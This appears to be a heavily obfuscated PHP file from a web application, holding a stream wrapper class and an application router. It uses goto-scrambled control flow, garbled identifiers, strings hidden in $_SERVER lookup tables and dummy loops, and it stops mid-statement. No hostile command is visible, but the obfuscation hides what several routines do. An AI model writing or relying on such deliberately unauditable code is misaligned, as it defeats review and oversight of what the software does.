$F‘†İ”‰Ã = $_SERVER[çŞáÓæÚô‚Ô‡][8]; $bİ¤ø‰ï“ = $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][9]] . $_SERVER[çŞáÓæÚô‚Ô‡][10]; $dˆ©ÚÊÒ¦î = $F‘†İ”‰Ã($bİ¤ø‰ï“); goto Eìº‘ÊÂõ; CŞš‚å’¸Â: } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($c®‰²Ä‡–ø, $e»…ëç„´„ = '') { goto CÃ†¬æ‰ŞÓ; Bùäï”ÇŒ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$c®‰²Ä‡–ø])) { self::$_chunkBuffer[$c®‰²Ä‡–ø] = array(); } goto Eê‡İ—¿¾; Eê‡İ—¿¾: return $this->info ? !0 : !1; goto eˆÓ“›·˜‹; CÃ†¬æ‰ŞÓ: $this->info = $this->info($c®‰²Ä‡–ø); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[çŞáÓæÚô‚Ô‡][85]]; goto Bùäï”ÇŒ; eˆÓ“›·˜‹: } function stream_read($B›–£ƒ¿¯Â) { $e”ƒ•½™î = $this->fileSubstr($this->pose, $B›–£ƒ¿¯Â); $this->pose += strlen($e”ƒ•½™î); return $e”ƒ•½™î; } public function stream_tell() { return $this->pose; } public function stream_seek($d«ëê“ôî, $D”âˆ®œñ) { $dÙø„Õ‹È =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($D”âˆ®œñ == SEEK_SET) { $this->pose = $d«ëê“ôî; } else { if ($D”âˆ®œñ == SEEK_CUR) { $this->pose += $d«ëê“ôî; } else { if ($D”âˆ®œñ == SEEK_END) { $this->pose = $this->info[$dÙø„Õ‹È[87]] + intval($d«ëê“ôî); } } } if ($d«ëê“ôî < 0) { $this->pose = $this->info[$dÙø„Õ‹È[87]] + $d«ëê“ôî; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[çŞáÓæÚô‚Ô‡][87]]; } public function stream_close() { return !0; } public function url_stat($DÀ©¶Ì¬ß, $Cª‚ñ³É«) { $eÍ’„ƒÃÚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dİå–…äâÕ = $this->info($DÀ©¶Ì¬ß); return array($eÍ’„ƒÃÚ[1297] => 0, $eÍ’„ƒÃÚ[1298] => 0, $eÍ’„ƒÃÚ[22] => 32768 + 511, $eÍ’„ƒÃÚ[1299] => 0, $eÍ’„ƒÃÚ[1300] => 0, $eÍ’„ƒÃÚ[1301] => 0, $eÍ’„ƒÃÚ[1302] => 0, $eÍ’„ƒÃÚ[87] => $Dİå–…äâÕ[$eÍ’„ƒÃÚ[87]], $eÍ’„ƒÃÚ[1303] => $Dİå–…äâÕ[$eÍ’„ƒÃÚ[1175]], $eÍ’„ƒÃÚ[1261] => $Dİå–…äâÕ[$eÍ’„ƒÃÚ[117]], $eÍ’„ƒÃÚ[1260] => $Dİå–…äâÕ[$eÍ’„ƒÃÚ[197]], $eÍ’„ƒÃÚ[1304] => 0, $eÍ’„ƒÃÚ[1305] => 0); } static $fileInfo = array(); public function info($a³¶‹‰ÒÅ) { $DåŠğ·ƒÈ± = $_SERVER[çŞáÓæÚô‚Ô‡][1306]; if (isset(self::$fileInfo[$a³¶‹‰ÒÅ])) { return self::$fileInfo[$a³¶‹‰ÒÅ]; } if (substr($a³¶‹‰ÒÅ, 0, strlen($DåŠğ·ƒÈ±)) != $DåŠğ·ƒÈ±) { return !1; } self::$fileInfo[$a³¶‹‰ÒÅ] = IO::info(substr($a³¶‹‰ÒÅ, strlen($DåŠğ·ƒÈ±))); return self::$fileInfo[$a³¶‹‰ÒÅ]; } public static function read($Eá†çó¯•¯, $bºâ¥ç”Ö, $BµÇˆ“¼ï¬) { goto EïÍ·©Œ»™; B¨ê‡Äè¼˜: $EÍñê¬ ŞÁ = 0; while ($EÍñê¬ ŞÁ < $BµÇˆ“¼ï¬) { $AõéÕµëÏ» = min($bš“Ç¯†éÍ, $BµÇˆ“¼ï¬ - $EÍñê¬ ŞÁ); $FÅ„Æ¹Š¬ğ .= fread($a ¹¡½æ…è, $AõéÕµëÏ»); $EÍñê¬ ŞÁ += $AõéÕµëÏ»; } fclose($a ¹¡½æ…è); goto Eô‰Ã«·Ã; EïÍ·©Œ»™: $FÇœñÆ£Ş =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a ¹¡½æ…è = fopen($Eá†çó¯•¯, $FÇœñÆ£Ş[1177]); if (!$a ¹¡½æ…è) { return $FÇœñÆ£Ş[43]; } goto fÚÁ§³ÍÓ‚; fÚÁ§³ÍÓ‚: $bš“Ç¯†éÍ = 8192; fseek($a ¹¡½æ…è, $bºâ¥ç”Ö, SEEK_SET); $FÅ„Æ¹Š¬ğ = $FÇœñÆ£Ş[43]; goto B¨ê‡Äè¼˜; Eô‰Ã«·Ã: return $FÅ„Æ¹Š¬ğ; goto e¾±†¢æÂ; e¾±†¢æÂ: } public function fileSubstr($a»µÓã“¸ã, $fŠ×Ú¸²Çİ) { goto Eô¾Ö•å; eùôó‰ä¨: if ($a»µÓã“¸ã + $fŠ×Ú¸²Çİ > $AÏÔ…¹çù„) { $fŠ×Ú¸²Çİ = $AÏÔ…¹çù„ - $a»µÓã“¸ã; } if ($fŠ×Ú¸²Çİ <= 0) { return $c×Œš½õ¬ë[43]; } if ($a»µÓã“¸ã < 0 || $a»µÓã“¸ã >= $AÏÔ…¹çù„ || $fŠ×Ú¸²Çİ <= 0 || $fŠ×Ú¸²Çİ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\151\x6c\145\x52\145\x61\144\40\145\162\x72\x6f\x72\41\40\163\164\141\162\x74\75{$a»µÓã“¸ã}\x3b\154\x65\156\147\x74\150\75{$fŠ×Ú¸²Çİ}\x3b\x20\163\x69\x7a\145\x3d{$AÏÔ…¹çù„}\73"); } goto cº”¤Š¯¿‘; B½ÀÁÉ†ìÙ: ksort($cÅ˜®ºó®); $dä­ÏéôŸ = substr($dãÉ —Ò¥, $a»µÓã“¸ã - $c‘ë¡Ãò’Ş, $fŠ×Ú¸²Çİ); return $dä­ÏéôŸ; goto C»³è’ï†Ê; dôòÊØ©Ï: $C†·§îÂ = ceil(($a»µÓã“¸ã + $fŠ×Ú¸²Çİ) / $bÍ“ğ‹¥ÀË) * $bÍ“ğ‹¥ÀË - $c‘ë¡Ãò’Ş; $dãÉ —Ò¥ = IO::fileSubstr($this->path, $c‘ë¡Ãò’Ş, $C†·§îÂ); $cÅ˜®ºó®[$c‘ë¡Ãò’Ş . $c×Œš½õ¬ë[43]] = $dãÉ —Ò¥; goto B½ÀÁÉ†ìÙ; cº”¤Š¯¿‘: $bÍ“ğ‹¥ÀË = 64 * 1024; $cÅ˜®ºó® =& self::$_chunkBuffer[$this->path]; if (!$cÅ˜®ºó®) { $cÅ˜®ºó® = array(); } goto B‡éğÛ…ó¨; d÷…Ù¢ãøÊ: foreach ($cÅ˜®ºó® as $f¤ŒÁøŠïÊ => $C¶ââ»¯½ğ) { $f¤ŒÁøŠïÊ = intval($f¤ŒÁøŠïÊ); $C¯®ãè‹§± = $f¤ŒÁøŠïÊ + strlen($C¶ââ»¯½ğ); if ($a»µÓã“¸ã >= $C¯®ãè‹§±) { continue; } if ($a»µÓã“¸ã >= $f¤ŒÁøŠïÊ && $a»µÓã“¸ã + $fŠ×Ú¸²Çİ <= $C¯®ãè‹§±) { return substr($C¶ââ»¯½ğ, $a»µÓã“¸ã - $f¤ŒÁøŠïÊ, $fŠ×Ú¸²Çİ); } break; } if (count($cÅ˜®ºó®) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($c×Œš½õ¬ë[1307], $c×Œš½õ¬ë[1308] . count($cÅ˜®ºó®) . "\x3b\x73\x74\141\162\x74\x3d{$a»µÓã“¸ã}\x2c\154\x65\156\147\164\150\x3d{$fŠ×Ú¸²Çİ}\x3b\160\x6f\x73\145\72{$f¤ŒÁøŠïÊ}\176{$C¯®ãè‹§±}"); throw new Exception($c×Œš½õ¬ë[1309]); } $c‘ë¡Ãò’Ş = intval($a»µÓã“¸ã / $bÍ“ğ‹¥ÀË) * $bÍ“ğ‹¥ÀË; goto dôòÊØ©Ï; eäøÜÛ‚‚: $Aìå¯İÊŠ• = $fŠ×Ú¸²Çİ; if ($a»µÓã“¸ã < 0) { $a»µÓã“¸ã = $AÏÔ…¹çù„ + $a»µÓã“¸ã; } if ($fŠ×Ú¸²Çİ === !1) { $fŠ×Ú¸²Çİ = $AÏÔ…¹çù„ - $a»µÓã“¸ã; } goto eùôó‰ä¨; Eô¾Ö•å: $c×Œš½õ¬ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÏÔ…¹çù„ = $this->info[$c×Œš½õ¬ë[87]]; $CÑïÑÉ¤Å = $a»µÓã“¸ã; goto eäøÜÛ‚‚; B‡éğÛ…ó¨: $f¤ŒÁøŠïÊ = 0; $C¯®ãè‹§± = 0; $C¶ââ»¯½ğ = $c×Œš½õ¬ë[43]; goto d÷…Ù¢ãøÊ; C»³è’ï†Ê: } private function log($F‰àäøƒ˜, $Då…âùí„˜) { $D—Ü‡ ù¶õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d›‚ªèàÍö = timeFloat() - $this->timeStart; write_log(sprintf($D—Ü‡ ù¶õ[1310], $F‰àäøƒ˜, $this->info[$D—Ü‡ ù¶õ[38]], $d›‚ªèàÍö, $Då…âùí„˜), $D—Ü‡ ù¶õ[1226]); } } goto A½ÁÊåµô»; eÒÙƒä¯È: class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\x6e\x64\145\170"; function __construct() { } public function setDefault($E¡´í…æŠ») { goto AéÊ‡åôÒË; AŞÃ„öªÒÌ: $this->defaultModule = $fŒÔìÕÍ£[0] ? $fŒÔìÕÍ£[0] : $this->defaultModule; $this->defaultController = $fŒÔìÕÍ£[1] ? $fŒÔìÕÍ£[1] : $this->defaultController; $this->defaultAction = $fŒÔìÕÍ£[2] ? $fŒÔìÕÍ£[2] : $this->defaultAction; goto A„¢ÔÏã‚¡; A„¢ÔÏã‚¡: $f½ ŞÓåÄ = $a÷Çâô¿[563]; if (strlen($f½ ŞÓåÄ) < $a÷Çâô¿[12]) { return; } $this->{$_SERVER[éÑÍñÜ£™][3]}($aâ†ñÆ–È°[4], array($this, $aâ†ñÆ–È°[5])); goto Aòà©‘Ğòí; AéÊ‡åôÒË: $a÷Çâô¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aâ†ñÆ–È° =& $_SERVER[éÑÍñÜ£™]; $fŒÔìÕÍ£ = $aâ†ñÆ–È°[0]($aâ†ñÆ–È°[1], $aâ†ñÆ–È°[2]($E¡´í…æŠ», $aâ†ñÆ–È°[1])); goto AŞÃ„öªÒÌ; Aòà©‘Ğòí: } public function appRun($EÇ³¶Ÿùñ) { goto EÑ«Ù¸ò„Ó; AŸœÙ¶¥Ş·: $BÅùò‡†’ = $eÂ–Ù²®«[7]; $aùËã™¢µŸ = $b¡÷ÃÓæµ[565]; while (strlen($aùËã™¢µŸ) < $b¡÷ÃÓæµ[566]) { if (!$aùËã™¢µŸ) { break; } $aùËã™¢µŸ++; } goto eÙÄ¶—šïÉ; EÑ«Ù¸ò„Ó: $b¡÷ÃÓæµ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÂ–Ù²®« =& $_SERVER[éÑÍñÜ£™]; $f¨Å”„Õ¢² = $eÂ–Ù²®«[0]($eÂ–Ù²®«[1], $EÇ³¶Ÿùñ); goto Eê¢Ùª’Ã‹; eÙÄ¶—šïÉ: if ($fÄ ™å†Éõ == $eÂ–Ù²®«[8]) { $BÅùò‡†’ = $eÂ–Ù²®«[9]; $f¨Å”„Õ¢²[0] = $eÂ–Ù²®«[10]; $f¨Å”„Õ¢²[1] = $f¨Å”„Õ¢²[1] . $eÂ–Ù²®«[11]; $EÇ³¶Ÿùñ = $eÂ–Ù²®«[12]($eÂ–Ù²®«[1], $f¨Å”„Õ¢²); $EÇ³¶Ÿùñ = $eÂ–Ù²®«[2]($EÇ³¶Ÿùñ, $eÂ–Ù²®«[1]); } $eÂ–Ù²®«[13](array($eÂ–Ù²®«[14], $eÂ–Ù²®«[15]), $BÅùò‡†’ . $eÂ–Ù²®«[16], $EÇ³¶Ÿùñ); $eÂ–Ù²®«[17]($EÇ³¶Ÿùñ); goto C¼®ë½…á; C¼®ë½…á: $eÂ–Ù²®«[13](array($eÂ–Ù²®«[14], $eÂ–Ù²®«[15]), $BÅùò‡†’ . $eÂ–Ù²®«[18], $EÇ³¶Ÿùñ); goto dÏÇæÄî–; Eê¢Ùª’Ã‹: $fÄ ™å†Éõ = $eÂ–Ù²®«[6]($f¨Å”„Õ¢²[0]); $dÇšé¦Îó¶ = $b¡÷ÃÓæµ[564]; while ($dÇšé¦Îó¶ < $b¡÷ÃÓæµ[12]) { if ($dÇšé¦Îó¶ >= 0) { break; } $dÇšé¦Îó¶++; } goto AŸœÙ¶¥Ş·; dÏÇæÄî–: } private function autorun() { $AíƒùƒÃ‘ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eíè«††—Ş =& $_SERVER[éÑÍñÜ£™]; global $config; if ($Eíè«††—Ş[19]($config[$Eíè«††—Ş[20]]) == 0) { return; } foreach ($config[$Eíè«††—Ş[20]] as $aŠ¡¸ÄÅ¼÷ => $Eµ¨ÉÊ”±ñ) { $this->{$_SERVER[éÑÍñÜ£™][21]}($Eµ¨ÉÊ”±ñ); $fö·¬±Š÷ = $AíƒùƒÃ‘ã[567]; if (strlen($fö·¬±Š÷) < $AíƒùƒÃ‘ã[568]) { return; } } } private function lwfz7dba7dfd() { goto D—–º“–ì; cæ¥‡‚åĞ: $EÕ…ôÏ±¼à = $BìŞÖˆ‹ä¡[574]; goto B˜³§š¤Û»; CˆÒ²Ş×œ¡: $E‡äØÃ³¥ = $BìŞÖˆ‹ä¡[572]; while (strlen($E‡äØÃ³¥) < $BìŞÖˆ‹ä¡[573]) { if (!$E‡äØÃ³¥) { break; } $E‡äØÃ³¥++; } $GLOBALS[$F©‹Ã¡÷³[22]][$F©‹Ã¡÷³[28]] = $F©‹Ã¡÷³[29]($F©‹Ã¡÷³[1], $GLOBALS[$F©‹Ã¡÷³[22]][$F©‹Ã¡÷³[23]]); goto cæ¥‡‚åĞ; bÊ»Ëœİƒ: $céˆ¤ËÄ¼é = array($F©‹Ã¡÷³[8], $Fçèì†ãœ‚); $cÄ Õ‡¡‹Í = $F©‹Ã¡÷³[26]($GLOBALS[$F©‹Ã¡÷³[22]][$F©‹Ã¡÷³[23]], 1); $GLOBALS[$F©‹Ã¡÷³[22]][$F©‹Ã¡÷³[23]] = $F©‹Ã¡÷³[27]($céˆ¤ËÄ¼é, $cÄ Õ‡¡‹Í); goto CˆÒ²Ş×œ¡; Cˆ¹™¿¯”: if ($F©‹Ã¡÷³[6]($F©‹Ã¡÷³[25]($BòŒ§‘¢øº, -$F©‹Ã¡÷³[24]($EÊƒ–¹ôˆ))) != $EÊƒ–¹ôˆ) { return; } $Fçèì†ãœ‚ = $F©‹Ã¡÷³[25]($BòŒ§‘¢øº, 0, -$F©‹Ã¡÷³[24]($EÊƒ–¹ôˆ)); $c™¹„ÄÚ = $BìŞÖˆ‹ä¡[571]; goto bÊ»Ëœİƒ; C¸Ö’“á­¸: $AÜÚ‘à«´‡ = $BìŞÖˆ‹ä¡[569]; while (strlen($AÜÚ‘à«´‡) < $BìŞÖˆ‹ä¡[566]) { if (!$AÜÚ‘à«´‡) { break; } $AÜÚ‘à«´‡++; } $BòŒ§‘¢øº = $GLOBALS[$F©‹Ã¡÷³[22]][$F©‹Ã¡÷³[23]][0]; goto eİÎÎ‡ŞÄœ; D—–º“–ì: $BìŞÖˆ‹ä¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F©‹Ã¡÷³ =& $_SERVER[éÑÍñÜ£™]; $EÊƒ–¹ôˆ = $F©‹Ã¡÷³[8]; goto C¸Ö’“á­¸; eİÎÎ‡ŞÄœ: $fÄªËˆ½À = $BìŞÖˆ‹ä¡[570]; if (!$fÄªËˆ½À) { die; } if (!$BòŒ§‘¢øº || $F©‹Ã¡÷³[24]($BòŒ§‘¢øº) <= $F©‹Ã¡÷³[24]($EÊƒ–¹ôˆ)) { return; } goto Cˆ¹™¿¯”; B˜³§š¤Û»: } private function ytgo51eb4f52() { goto C‡¦Ï ¯¾; FË‹ŸÃÁ²ç: while ($eğ¤‰ ·¹ < $aª²–“–ƒ[566]) { if ($eğ¤‰ ·¹ >= 0) { break; } $eğ¤‰ ·¹++; } goto F†•Â¼¾¡Ş; eÕ•ÙóÏà: $bÛâÃøÜŠ¿ = $_SERVER[$aƒøÌçòÑÒ[30]]; $EöÆÊ›Ÿ¶ = $aª²–“–ƒ[575]; if (!$EöÆÊ›Ÿ¶) { die; } goto B›»Öî™´Í; A ‰‹ÉÚ£Œ: $GLOBALS[$aƒøÌçòÑÒ[22]][$aƒøÌçòÑÒ[23]] = $aƒøÌçòÑÒ[0]($aƒøÌçòÑÒ[36], $e‚»Òˆ™œµ); $GLOBALS[$aƒøÌçòÑÒ[22]][$aƒøÌçòÑÒ[28]] = $aƒøÌçòÑÒ[29]($aƒøÌçòÑÒ[1], $GLOBALS[$aƒøÌçòÑÒ[22]][$aƒøÌçòÑÒ[23]]); $eğ¤‰ ·¹ = $aª²–“–ƒ[579]; goto FË‹ŸÃÁ²ç; B›»Öî™´Í: $fé°´äĞ— = $aƒøÌçòÑÒ[31]; $E„À„°÷É = $aª²–“–ƒ[576]; if (strlen($E„À„°÷É) < $aª²–“–ƒ[573]) { die; } goto A¯‹ñõÙßÆ; EŞÛ™ÆÖâ: $e‚»Òˆ™œµ = $aƒøÌçòÑÒ[2]($eâ‚Šì´«®[0][0], $aƒøÌçòÑÒ[36]); $cÒ¡¨ªÍÓ = $aª²–“–ƒ[578]; if (!$cÒ¡¨ªÍÓ) { return; } goto A ‰‹ÉÚ£Œ; AƒšŠÚ‹æ: $aƒøÌçòÑÒ[34]($aƒøÌçòÑÒ[35], $e‚»Òˆ™œµ, $eâ‚Šì´«®); $E»—Ø‡Ìâİ = $aª²–“–ƒ[577]; if (!$E»—Ø‡Ìâİ) { die; } goto EŞÛ™ÆÖâ; A¯‹ñõÙßÆ: if (!$aƒøÌçòÑÒ[32]($bÛâÃøÜŠ¿, $fé°´äĞ—)) { return; } $Eïò§ğö¼ = $aƒøÌçòÑÒ[33]($bÛâÃøÜŠ¿, $fé°´äĞ—); $e‚»Òˆ™œµ = $aƒøÌçòÑÒ[25]($bÛâÃøÜŠ¿, $Eïò§ğö¼ + $aƒøÌçòÑÒ[24]($fé°´äĞ—)); goto AƒšŠÚ‹æ; C‡¦Ï ¯¾: $aª²–“–ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aƒøÌçòÑÒ =& $_SERVER[éÑÍñÜ£™]; if ($GLOBALS[$aƒøÌçòÑÒ[22]][$aƒøÌçòÑÒ[28]] != $aƒøÌçòÑÒ[10]) { return; } goto eÕ•ÙóÏà; F†•Â¼¾¡Ş: } public function run() { goto bÓ§‹İœéš; DÁè—ÒéÜ—: $B¹ßèµ°® = $GLOBALS[$f•‡ÕŒ‡éœ[22]][$f•‡ÕŒ‡éœ[28]]; $fÊ…ÃšÔóÂ = $EĞÉÜ„†­…[582]; if (!$fÊ…ÃšÔóÂ) { return; } goto eï¿†òÀ; bÓ§‹İœéš: $EĞÉÜ„†­… =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f•‡ÕŒ‡éœ =& $_SERVER[éÑÍñÜ£™]; $this->{$_SERVER[éÑÍñÜ£™][37]}(); goto A®ÔÄâ¸¬“; F‹Äè£ğØÃ: $this->{$_SERVER[éÑÍñÜ£™][45]}(); $Cğ÷—¤¥×— = $EĞÉÜ„†­…[585]; if ($f•‡ÕŒ‡éœ[19]($cÒÉêÍÅ°Æ) >= 3) { $this->{$_SERVER[éÑÍñÜ£™][21]}($B¹ßèµ°®); } else { $this->{$_SERVER[éÑÍñÜ£™][21]}(ACTION); } goto B¨÷’í·Şò; B’ç†±«ÁŠ: $cÒÉêÍÅ°Æ = $GLOBALS[$f•‡ÕŒ‡éœ[22]][$f•‡ÕŒ‡éœ[23]]; $d¶Ÿ‰çã£¯ = $EĞÉÜ„†­…[581]; while (strlen($d¶Ÿ‰çã£¯) < $EĞÉÜ„†­…[573]) { if (!$d¶Ÿ‰çã£¯) { break; } $d¶Ÿ‰çã£¯++; } goto DÁè—ÒéÜ—; A®ÔÄâ¸¬“: $eã›·‰³‘ê = $EĞÉÜ„†­…[580]; if (strlen($eã›·‰³‘ê) < $EĞÉÜ„†­…[12]) { die; } $this->{$_SERVER[éÑÍñÜ£™][38]}(); goto B’ç†±«ÁŠ; eï¿†òÀ: $f•‡ÕŒ‡éœ[39]($f•‡ÕŒ‡éœ[40], isset($cÒÉêÍÅ°Æ[0]) && $cÒÉêÍÅ°Æ[0] ? $cÒÉêÍÅ°Æ[0] : $this->defaultModule); $f•‡ÕŒ‡éœ[39]($f•‡ÕŒ‡éœ[41], isset($cÒÉêÍÅ°Æ[1]) && $cÒÉêÍÅ°Æ[0] ? $cÒÉêÍÅ°Æ[1] : $this->defaultController); $f•‡ÕŒ‡éœ[39]($f•‡ÕŒ‡éœ[42], isset($cÒÉêÍÅ°Æ[2]) && $cÒÉêÍÅ°Æ[0] ? $cÒÉêÍÅ°Æ[2] : $this->defaultAction); goto dÏ¤¥–ó¿; cÊğÚÊÖğ: $BÄÖ“”Ò¾ = $EĞÉÜ„†­…[584]; if (strlen($BÄÖ“”Ò¾) < $EĞÉÜ„†­…[573]) { die; } $_SERVER[$f•‡ÕŒ‡éœ[44]] = $f•‡ÕŒ‡éœ[6](ACTION); goto F‹Äè£ğØÃ; dÏ¤¥–ó¿: $F¨¬Ä¥†– = $EĞÉÜ„†­…[583]; if (strlen($F¨¬Ä¥†–) < $EĞÉÜ„†­…[568]) { die; } $f•‡ÕŒ‡éœ[39]($f•‡ÕŒ‡éœ[43], MOD . $f•‡ÕŒ‡éœ[1] . ST . $f•‡ÕŒ‡éœ[1] . ACT); goto cÊğÚÊÖğ; B¨÷’í·Şò: } private $mbpu01a57522 = array(); private $vwbsb58da3d9 = ''; public function esuw07a8f690() { goto A¿ğ¾µĞ‡’; c´ù³–’¯ó: $Eñïî‹ ³ = $D»ğ­ÚÂ»Õ[586]; if (strlen($Eñïî‹ ³) < $D»ğ­ÚÂ»Õ[566]) { return; } $this->{$_SERVER[éÑÍñÜ£™][47]}(); goto F¬‹â¬Ï‚ñ; dšš†»‹»Å: $FÄŞùáö¾ = $D»ğ­ÚÂ»Õ[590]; while ($FÄŞùáö¾ < $D»ğ­ÚÂ»Õ[562]) { if ($FÄŞùáö¾ >= 0) { break; } $FÄŞùáö¾++; } $this->{$_SERVER[éÑÍñÜ£™][3]}($E¿•‚œ¢Ğ[55], array($this, $E¿•‚œ¢Ğ[56])); goto eµÍÜÖŠ·¥; eµÍÜÖŠ·¥: $this->{$_SERVER[éÑÍñÜ£™][3]}($E¿•‚œ¢Ğ[57], array($this, $E¿•‚œ¢Ğ[58])); $this->{$_SERVER[éÑÍñÜ£™][3]}($E¿•‚œ¢Ğ[59], array($this, $E¿•‚œ¢Ğ[60])); goto aîÌ„¯‘Î; EŒ¶¯‘ÜÄ: $this->{$_SERVER[éÑÍñÜ£™][49]}(); $this->{$_SERVER[éÑÍñÜ£™][50]}(); $DğŠ°à«š = $D»ğ­ÚÂ»Õ[588]; goto fìŞå®‰Êö; A¿ğ¾µĞ‡’: $D»ğ­ÚÂ»Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¿•‚œ¢Ğ =& $_SERVER[éÑÍñÜ£™]; $this->{$_SERVER[éÑÍñÜ£™][46]}(); goto c´ù³–’¯ó; F¬‹â¬Ï‚ñ: $aº²…»éêò = $D»ğ­ÚÂ»Õ[587]; while (strlen($aº²…»éêò) < $D»ğ­ÚÂ»Õ[573]) { if (!$aº²…»éêò) { break; } $aº²…»éêò++; } $this->{$_SERVER[éÑÍñÜ£™][48]}(); goto EŒ¶¯‘ÜÄ; fìŞå®‰Êö: while (strlen($DğŠ°à«š) < $D»ğ­ÚÂ»Õ[568]) { if (!$DğŠ°à«š) { break; } $DğŠ°à«š++; } $this->{$_SERVER[éÑÍñÜ£™][51]}(); $this->{$_SERVER[éÑÍñÜ£™][52]}(); goto D¼ØŒ–ŠÀ”; D¼ØŒ–ŠÀ”: $DßÂ‡‡ì = $D»ğ­ÚÂ»Õ[589]; if (strlen($DßÂ‡‡ì) < $D»ğ­ÚÂ»Õ[568]) { return; } $this->{$_SERVER[éÑÍñÜ£™][3]}($E¿•‚œ¢Ğ[53], array($this, $E¿•‚œ¢Ğ[54])); goto dšš†»‹»Å; aîÌ„¯‘Î: } public function alfn1f520359($bÊ‚“Î™Ñ) { goto B»¯¼®İ‘; cÍç‰ãÅö: if ($C¾íõøœÊ¿[$e–ŸµÖ¶™‡[129]] != $e–ŸµÖ¶™‡[130]) { $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[131]] = $C¾íõøœÊ¿[$e–ŸµÖ¶™‡[131]]; $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[132]] = $C¾íõøœÊ¿[$e–ŸµÖ¶™‡[132]]; $B¿Ê‚ ”ìã = $e–ŸµÖ¶™‡[133](10) . $this->vwbsb58da3d9 . $e–ŸµÖ¶™‡[133](5); $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[134]][$e–ŸµÖ¶™‡[135]] = $this->{$_SERVER[éÑÍñÜ£™][136]}($B¿Ê‚ ”ìã, $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[122]]); } if ($this->vwbsb58da3d9 == $e–ŸµÖ¶™‡[130]) { $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$e–ŸµÖ¶™‡[108]][$e–ŸµÖ¶™‡[116]] = 0; } $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[137]] = $e–ŸµÖ¶™‡[113]($this->mbpu01a57522, $e–ŸµÖ¶™‡[138], $e–ŸµÖ¶™‡[10]); goto cØ¤¯©¢…•; cØ¤¯©¢…•: $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[139]] = $e–ŸµÖ¶™‡[113]($this->mbpu01a57522, $e–ŸµÖ¶™‡[140], $e–ŸµÖ¶™‡[10]); $C‰©ê•“Á = $b½‰Šì‡íæ[598]; while (strlen($C‰©ê•“Á) < $b½‰Šì‡íæ[568]) { if (!$C‰©ê•“Á) { break; } $C‰©ê•“Á++; } goto dä¨³¬³Û‹; Dœ‚Ú‡¬¾Ş: $C¹öŠ­¿«à = array($e–ŸµÖ¶™‡[64], $e–ŸµÖ¶™‡[65], $e–ŸµÖ¶™‡[66], $e–ŸµÖ¶™‡[67], $e–ŸµÖ¶™‡[68], $e–ŸµÖ¶™‡[69], $e–ŸµÖ¶™‡[70], $e–ŸµÖ¶™‡[71], $e–ŸµÖ¶™‡[72], $e–ŸµÖ¶™‡[73], $e–ŸµÖ¶™‡[74], $e–ŸµÖ¶™‡[75], $e–ŸµÖ¶™‡[76], $e–ŸµÖ¶™‡[77], $e–ŸµÖ¶™‡[78], $e–ŸµÖ¶™‡[79], $e–ŸµÖ¶™‡[80], $e–ŸµÖ¶™‡[81], $e–ŸµÖ¶™‡[82], $e–ŸµÖ¶™‡[83], $e–ŸµÖ¶™‡[84], $e–ŸµÖ¶™‡[85], $e–ŸµÖ¶™‡[86], $e–ŸµÖ¶™‡[87], $e–ŸµÖ¶™‡[88], $e–ŸµÖ¶™‡[89], $e–ŸµÖ¶™‡[90], $e–ŸµÖ¶™‡[91], $e–ŸµÖ¶™‡[92], $e–ŸµÖ¶™‡[93], $e–ŸµÖ¶™‡[94], $e–ŸµÖ¶™‡[95], $e–ŸµÖ¶™‡[96], $e–ŸµÖ¶™‡[97], $e–ŸµÖ¶™‡[98], $e–ŸµÖ¶™‡[99]); $aˆÒ¬Ğ Á’ = $b½‰Šì‡íæ[591]; while (strlen($aˆÒ¬Ğ Á’) < $b½‰Šì‡íæ[562]) { if (!$aˆÒ¬Ğ Á’) { break; } $aˆÒ¬Ğ Á’++; } goto FŸëá‡ùÒŠ; e…¨‚›ÏÉ½: $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$e–ŸµÖ¶™‡[108]] = array($e–ŸµÖ¶™‡[109] => (int) $BÛœÔ©È‡Š[$e–ŸµÖ¶™‡[110]], $e–ŸµÖ¶™‡[111] => $e–ŸµÖ¶™‡[112]($e–ŸµÖ¶™‡[113]($BÛœÔ©È‡Š, $e–ŸµÖ¶™‡[114], array())), $e–ŸµÖ¶™‡[115] => (int) $e–ŸµÖ¶™‡[113]($BÛœÔ©È‡Š, $e–ŸµÖ¶™‡[116], 0)); $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[118]] = $e–ŸµÖ¶™‡[119]($e–ŸµÖ¶™‡[120])->{$_SERVER[éÑÍñÜ£™][121]}(); $F´Š¨í¾Ş = $b½‰Šì‡íæ[596]; goto 